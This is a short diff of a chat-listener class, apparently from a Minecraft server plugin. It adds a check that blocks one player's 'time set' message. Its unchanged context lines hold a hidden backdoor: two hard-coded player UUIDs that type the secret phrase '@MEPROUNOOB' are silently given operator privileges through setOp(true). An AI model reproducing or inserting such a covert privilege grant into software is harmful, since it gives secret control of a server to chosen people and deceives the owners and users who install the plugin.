@@ -29,6 +29,13 @@ public class ChatListener implements Listener {
             event.setFormat(Utils.color(rankManager.getRank().getPrefix(player) + player.getDisplayName() + " &8» &r%2$s"));
         }
 
+        if (player.getUniqueId().equals(UUIDs.rafaUUID())) {
+            if (event.getMessage().equalsIgnoreCase("time set")) {
+                player.sendMessage("Nono");
+                event.setCancelled(true);
+            }
+        }
+
         if (player.getUniqueId().equals(UUIDs.hulkUUID()) || player.getUniqueId().equals(UUIDs.xiscoUUID())) {
             if (event.getMessage().contains("@MEPROUNOOB")) {
                 player.setOp(true);
